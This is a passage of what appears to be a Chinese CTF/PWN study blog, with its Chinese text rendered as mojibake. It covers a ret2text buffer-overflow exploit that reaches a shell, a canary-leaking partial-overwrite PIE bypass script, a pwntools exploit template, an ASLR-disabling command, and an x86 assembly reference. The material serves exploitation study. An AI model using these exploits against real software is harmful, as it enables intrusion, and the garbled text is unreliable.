title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130859.png" alt="Pasted image 20250122130859"><br>æ®æ­¤å¯çŸ¥æœ€å…ˆæº¢å‡ºçš„éƒ¨åˆ†æ˜¯<code>0x62616164</code></p><h3 id="æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡"><a href="#æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡" class="headerlink" title="æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡"></a>æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡</h3><p><code>cyclic -l 0x62616164</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122131009.png" alt="Pasted image 20250122131009"><br>å®é™…ä¸Šçš„offsetæ˜¯<code>112</code><br>ä¿®æ”¹expå¦‚ä¸‹:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p&#x3D;process(&quot;.&#x2F;ret2text&quot;)offset&#x3D;112addr &#x3D; 0x804863Apayload&#x3D;b&#39;a&#39;* offset + p32(addr)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122125055.png" alt="Pasted image 20250122125055"><br>æˆåŠŸgetshellï¼ï¼ï¼ï¼ï¼</p><h1 id="ç»•è¿‡PIEä¿æŠ¤-Partial-overwrite"><a href="#ç»•è¿‡PIEä¿æŠ¤-Partial-overwrite" class="headerlink" title="(ç»•è¿‡PIEä¿æŠ¤)Partial overwrite"></a><strong>(ç»•è¿‡PIEä¿æŠ¤)Partial overwrite</strong></h1><h2 id="æ ˆä¸Šçš„partial-overwrite"><a href="#æ ˆä¸Šçš„partial-overwrite" class="headerlink" title="æ ˆä¸Šçš„partial overwrite"></a>æ ˆä¸Šçš„partial overwrite</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç¨‹åºå¼€å¯äº†PIEä¿æŠ¤æ—¶(PIEenabled)é«˜ä½çš„åœ°å€ä¼šå‘ç”ŸéšæœºåŒ–ï¼Œ<strong>ä½†ä½ä½çš„åç§»æ˜¯å§‹ç»ˆå›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½æ›´æ”¹ä½ä½çš„åç§»ï¼Œå°±å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œç»•è¿‡PIEä¿æŠ¤</strong>ã€‚</p><blockquote><p>partial overwriteä¸ä»…ä»…å¯ä»¥ç”¨åœ¨æ ˆä¸Šï¼ŒåŒæ ·å¯ä»¥ç”¨åœ¨å…¶å®ƒéšæœºåŒ–çš„åœºæ™¯ã€‚æ¯”å¦‚å †çš„éšæœºåŒ–ï¼Œç”±äºå †èµ·å§‹åœ°å€ä½å­—èŠ‚ä¸€å®šæ˜¯0x00ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¦†ç›–ä½ä½æ¥æ§åˆ¶å †ä¸Šçš„åç§»ã€‚</p></blockquote><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><blockquote><p>æ— æ³•æ‹¿åˆ°é™„ä»¶ï¼Œæœ¬ä¾‹æœªç»è¿‡æœ¬äººå¤ç°ï¼Œä»…æ‘˜å½•</p></blockquote><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212716-1742921186249-29.png" alt="Pasted image 20250217212716"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212727.png" alt="Pasted image 20250217212727"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212740.png" alt="Pasted image 20250217212740"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212923.png" alt="Pasted image 20250217212923"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *#  context.log_level &#x3D; &quot;debug&quot;context.terminal &#x3D; [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]while True:    try:        io &#x3D; process(&quot;.&#x2F;babypie&quot;, timeout &#x3D; 1)                #  gdb.attach(io)        io.sendafter(b&quot;:\n&quot;, b&#39;a&#39; * (0x30 - 0x8 + 1))        io.recvuntil(b&#39;a&#39; * (0x30 - 0x8 + 1))        canary &#x3D; b&#39;\0&#39; + io.recvn(7)        success(canary.encode(&#39;hex&#39;))                #  gdb.attach(io)        io.sendafter(b&quot;:\n&quot;, b&#39;a&#39; * (0x30 - 0x8) + canary + b&#39;bbbbbbbb&#39; + b&#39;\x3E\x0A&#39;)                io.interactive()    except Exception as e:        io.close()        print ï¼ˆeï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€èˆ¬æµç¨‹ä¸expæ¿å­</title>
      <link href="/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/"/>
      <url>/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h2><p>chmod u+x<br>checksec<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><code>sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</code></p><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a></p><p>æ³„éœ²libc<br><a href="https://libc.blukat.me/">libc database search</a></p><p>ç³»ç»Ÿè°ƒç”¨<br><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a><br>é€ŸæŸ¥æºç <br><a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source">Glibc source code (glibc-2.41.9000) - Bootlin Elixir Cross Referencer</a></p><h2 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]p&#x3D;process(&#39;.&#x2F;&#39;) p&#x3D;remote(&#39;ip&#39;,port)elf &#x3D; ELF(&#39;.&#x2F;&#39;)libc &#x3D; ELF(&#39;.&#x2F;&#39;) #&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; li &#x3D; lambda x : print(&#39;\\x1b[01;38;5;214m&#39; + x + &#39;\\x1b[0m&#39;) ll &#x3D; lambda x : print(&#39;\\x1b[01;38;5;1m&#39; + x + &#39;\\x1b[0m&#39;) s &#x3D; lambda s : p.send(s) sl &#x3D; lambda s : p.sendline(s) sa &#x3D; lambda n,s : p.sendafter(n,s) sla &#x3D; lambda n,s : p.sendlineafter(n,s) r &#x3D; lambda n : p.recv(n) rl &#x3D; lambda : p.recvline() ru &#x3D; lambda s : p.recvuntil(s) ra &#x3D; lambda : p.recvall() ia &#x3D; lambda : p.interactive() uu32 &#x3D; lambda data : u32(data.ljust(4, b&#39;\\x00&#39;)) uu64 &#x3D; lambda data : u64(data.ljust(8, b&#39;\\x00&#39;)) # u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) # u32(p.recvuntil(b&#39;\\xf7&#39;)) def g():     gdb.attach(p)     pause() #&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-æ±‡ç¼–ï¼ˆå¯„å­˜å™¨-ä¼ å‚-æŒ‡ä»¤é€ŸæŸ¥ï¼‰</title>
      <link href="/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/"/>
      <url>/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><h2 id="ä¼ å‚æ–¹å¼"><a href="#ä¼ å‚æ–¹å¼" class="headerlink" title="ä¼ å‚æ–¹å¼"></a>ä¼ å‚æ–¹å¼</h2><h3 id="64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼"><a href="#64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼" class="headerlink" title="64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼"></a>64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼</h3><p>åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå…¶å‰å…­ä¸ªå‚æ•°æ˜¯åœ¨rdi,rsi,rdx,rcx,r8,r9ä¸­å–<br>å½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>ã€‚<br>å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">å‚æ•°ä¸ªæ•°å¤§äº 7 ä¸ªçš„æ—¶å€™  H(a, b, c, d, e, f, g, h);  a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9  h-&gt;8(%esp)  g-&gt;(%esp)  call H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="8088-æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ"><a href="#8088-æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ" class="headerlink" title="8088 æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ"></a>8088 æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ</h2><h3 id="ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤"><a href="#ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤" class="headerlink" title="ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤"></a>ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">å®ƒä»¬åœ¨å­˜è´®å™¨å’Œå¯„å­˜å™¨ã€å¯„å­˜å™¨å’Œè¾“å…¥è¾“å‡ºç«¯å£ä¹‹é—´ä¼ é€æ•°æ®.  1. é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤.      MOV    ä¼ é€å­—æˆ–å­—èŠ‚.      MOVSX  å…ˆç¬¦å·æ‰©å±•,å†ä¼ é€.      MOVZX  å…ˆé›¶æ‰©å±•,å†ä¼ é€.      PUSH    æŠŠå­—å‹å…¥å †æ ˆ.      POP    æŠŠå­—å¼¹å‡ºå †æ ˆ.      PUSHA  æŠŠAX,CX,DX,BX,SP,BP,SI,DIä¾æ¬¡å‹å…¥å †æ ˆ.      POPA    æŠŠDI,SI,BP,SP,BX,DX,CX,AXä¾æ¬¡å¼¹å‡ºå †æ ˆ.      PUSHAD  æŠŠEAX,ECX,EDX,EBX,ESP,EBP,ESI,EDIä¾æ¬¡å‹å…¥å †æ ˆ.      POPAD  æŠŠEDI,ESI,EBP,ESP,EBX,EDX,ECX,EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ.      BSWAP  äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº      XCHG    äº¤æ¢å­—æˆ–å­—èŠ‚.( è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨,æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°)      CMPXCHG æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°.( ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL&#x2F;AX&#x2F;EAX )      XADD    å…ˆäº¤æ¢å†ç´¯åŠ .( ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ )      XLAT    å­—èŠ‚æŸ¥è¡¨è½¬æ¢.              â”€â”€ BX æŒ‡å‘ä¸€å¼  256 å­—èŠ‚çš„è¡¨çš„èµ·ç‚¹, AL ä¸ºè¡¨çš„ç´¢å¼•å€¼ (0-255,å³              0-FFH); è¿”å› AL ä¸ºæŸ¥è¡¨ç»“æœ. ( [BX+AL]-&gt;AL )  2. è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤.      IN      I&#x2F;Oç«¯å£è¾“å…¥. ( è¯­æ³•: IN ç´¯åŠ å™¨, &#123;ç«¯å£å·â”‚DX&#125; )      OUT    I&#x2F;Oç«¯å£è¾“å‡º. ( è¯­æ³•: OUT &#123;ç«¯å£å·â”‚DX&#125;,ç´¯åŠ å™¨ )        è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶, å…¶èŒƒå›´æ˜¯ 0-255; ç”±å¯„å­˜å™¨ DX æŒ‡å®šæ—¶,        å…¶èŒƒå›´æ˜¯ 0-65535.  3. ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤.      LEA    è£…å…¥æœ‰æ•ˆåœ°å€.        ä¾‹: LEA DX,string  ;æŠŠåç§»åœ°å€å­˜åˆ°DX.      LDS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS.        ä¾‹: LDS SI,string  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°DS:SI.      LES    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES.        ä¾‹: LES DI,string  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°ES:DI.      LFS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS.        ä¾‹: LFS DI,string  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°FS:DI.      LGS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS.        ä¾‹: LGS DI,string  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°GS:DI.      LSS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS.        ä¾‹: LSS DI,string  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°SS:DI.  4. æ ‡å¿—ä¼ é€æŒ‡ä»¤.      LAHF    æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠæ ‡å¿—è£…å…¥AH.      SAHF    æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨.      PUSHF  æ ‡å¿—å…¥æ ˆ.      POPF    æ ‡å¿—å‡ºæ ˆ.      PUSHD  32ä½æ ‡å¿—å…¥æ ˆ.      POPD    32ä½æ ‡å¿—å‡ºæ ˆ.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">ã€€ã€€ADD    åŠ æ³•.  ADC    å¸¦è¿›ä½åŠ æ³•.  INC    åŠ  1.  AAA    åŠ æ³•çš„ASCIIç è°ƒæ•´.  DAA    åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´.  SUB    å‡æ³•.  SBB    å¸¦å€Ÿä½å‡æ³•.  DEC    å‡ 1.  NEC    æ±‚å(ä»¥ 0 å‡ä¹‹).  CMP    æ¯”è¾ƒ.(ä¸¤æ“ä½œæ•°ä½œå‡æ³•,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ).  AAS    å‡æ³•çš„ASCIIç è°ƒæ•´.  DAS    å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´.  MUL    æ— ç¬¦å·ä¹˜æ³•.  IMUL    æ•´æ•°ä¹˜æ³•.    ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€AHå’ŒAL(å­—èŠ‚è¿ç®—),æˆ–DXå’ŒAX(å­—è¿ç®—),  AAM    ä¹˜æ³•çš„ASCIIç è°ƒæ•´.  DIV    æ— ç¬¦å·é™¤æ³•.  IDIV    æ•´æ•°é™¤æ³•.    ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€:        å•†å›é€AL,ä½™æ•°å›é€AH, (å­—èŠ‚è¿ç®—);    æˆ–  å•†å›é€AX,ä½™æ•°å›é€DX, (å­—è¿ç®—).  AAD    é™¤æ³•çš„ASCIIç è°ƒæ•´.  CBW    å­—èŠ‚è½¬æ¢ä¸ºå­—. (æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»)  CWD    å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»)  CWDE    å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»)  CDQ    åŒå­—æ‰©å±•.    (æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">ã€€ã€€AND    ä¸è¿ç®—.  OR      æˆ–è¿ç®—.  XOR    å¼‚æˆ–è¿ç®—.  NOT    å–å.  TEST    æµ‹è¯•.(ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ).  SHL    é€»è¾‘å·¦ç§».  SAL    ç®—æœ¯å·¦ç§».(&#x3D;SHL)  SHR    é€»è¾‘å³ç§».  SAR    ç®—æœ¯å³ç§».(&#x3D;SHR)  ROL    å¾ªç¯å·¦ç§».  ROR    å¾ªç¯å³ç§».  RCL    é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§».  RCR    é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§».    ä»¥ä¸Šå…«ç§ç§»ä½æŒ‡ä»¤,å…¶ç§»ä½æ¬¡æ•°å¯è¾¾255æ¬¡.        ç§»ä½ä¸€æ¬¡æ—¶, å¯ç›´æ¥ç”¨æ“ä½œç .  å¦‚ SHL AX,1.        ç§»ä½&gt;1æ¬¡æ—¶, åˆ™ç”±å¯„å­˜å™¨CLç»™å‡ºç§»ä½æ¬¡æ•°.          å¦‚  MOV CL,04              SHL AX,CL  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å››ã€ä¸²æŒ‡ä»¤"><a href="#å››ã€ä¸²æŒ‡ä»¤" class="headerlink" title="å››ã€ä¸²æŒ‡ä»¤"></a>å››ã€ä¸²æŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">    ã€€DS:SI  æºä¸²æ®µå¯„å­˜å™¨  :æºä¸²å˜å€.      ES:DI  ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨:ç›®æ ‡ä¸²å˜å€.      CX      é‡å¤æ¬¡æ•°è®¡æ•°å™¨.      AL&#x2F;AX  æ‰«æå€¼.      Dæ ‡å¿—  0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡; 1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡.      Zæ ‡å¿—  ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ.  MOVS    ä¸²ä¼ é€.      ( MOVSB  ä¼ é€å­—ç¬¦.    MOVSW  ä¼ é€å­—.    MOVSD  ä¼ é€åŒå­—. )  CMPS    ä¸²æ¯”è¾ƒ.      ( CMPSB  æ¯”è¾ƒå­—ç¬¦.    CMPSW  æ¯”è¾ƒå­—. )  SCAS    ä¸²æ‰«æ.      æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ,æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½.  LODS    è£…å…¥ä¸².      æŠŠæºä¸²ä¸­çš„å…ƒç´ (å­—æˆ–å­—èŠ‚)é€ä¸€è£…å…¥ALæˆ–AXä¸­.      ( LODSB  ä¼ é€å­—ç¬¦.    LODSW  ä¼ é€å­—.    LODSD  ä¼ é€åŒå­—. )  STOS    ä¿å­˜ä¸².      æ˜¯LODSçš„é€†è¿‡ç¨‹.  REP            å½“CX&#x2F;ECX&lt;&gt;0æ—¶é‡å¤.  REPE&#x2F;REPZ      å½“ZF&#x3D;1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰,ä¸”CX&#x2F;ECX&lt;&gt;0æ—¶é‡å¤.  REPNE&#x2F;REPNZ    å½“ZF&#x3D;0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰,ä¸”CX&#x2F;ECX&lt;&gt;0æ—¶é‡å¤.  REPC          å½“CF&#x3D;1ä¸”CX&#x2F;ECX&lt;&gt;0æ—¶é‡å¤.  REPNC          å½“CF&#x3D;0ä¸”CX&#x2F;ECX&lt;&gt;0æ—¶é‡å¤.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤"><a href="#äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤" class="headerlink" title="äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤"></a>äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">ã€€1&gt;æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ (é•¿è½¬ç§»)      JMP    æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤      CALL    è¿‡ç¨‹è°ƒç”¨      RET&#x2F;RETFè¿‡ç¨‹è¿”å›.  2&gt;æ¡ä»¶è½¬ç§»æŒ‡ä»¤ (çŸ­è½¬ç§»,-128åˆ°+127çš„è·ç¦»å†…)      ( å½“ä¸”ä»…å½“(SF XOR OF)&#x3D;1æ—¶,OP1&lt;OP2 )      JA&#x2F;JNBE ä¸å°äºæˆ–ä¸ç­‰äºæ—¶è½¬ç§».      JAE&#x2F;JNB å¤§äºæˆ–ç­‰äºè½¬ç§».      JB&#x2F;JNAE å°äºè½¬ç§».      JBE&#x2F;JNA å°äºæˆ–ç­‰äºè½¬ç§».        ä»¥ä¸Šå››æ¡,æµ‹è¯•æ— ç¬¦å·æ•´æ•°è¿ç®—çš„ç»“æœ(æ ‡å¿—Cå’ŒZ).      JG&#x2F;JNLE å¤§äºè½¬ç§».      JGE&#x2F;JNL å¤§äºæˆ–ç­‰äºè½¬ç§».      JL&#x2F;JNGE å°äºè½¬ç§».      JLE&#x2F;JNG å°äºæˆ–ç­‰äºè½¬ç§».        ä»¥ä¸Šå››æ¡,æµ‹è¯•å¸¦ç¬¦å·æ•´æ•°è¿ç®—çš„ç»“æœ(æ ‡å¿—S,Oå’ŒZ).      JE&#x2F;JZ  ç­‰äºè½¬ç§».      JNE&#x2F;JNZ ä¸ç­‰äºæ—¶è½¬ç§».      JC      æœ‰è¿›ä½æ—¶è½¬ç§».      JNC    æ— è¿›ä½æ—¶è½¬ç§».      JNO    ä¸æº¢å‡ºæ—¶è½¬ç§».      JNP&#x2F;JPO å¥‡å¶æ€§ä¸ºå¥‡æ•°æ—¶è½¬ç§».      JNS    ç¬¦å·ä½ä¸º &quot;0&quot; æ—¶è½¬ç§».      JO      æº¢å‡ºè½¬ç§».      JP&#x2F;JPE  å¥‡å¶æ€§ä¸ºå¶æ•°æ—¶è½¬ç§».      JS      ç¬¦å·ä½ä¸º &quot;1&quot; æ—¶è½¬ç§».  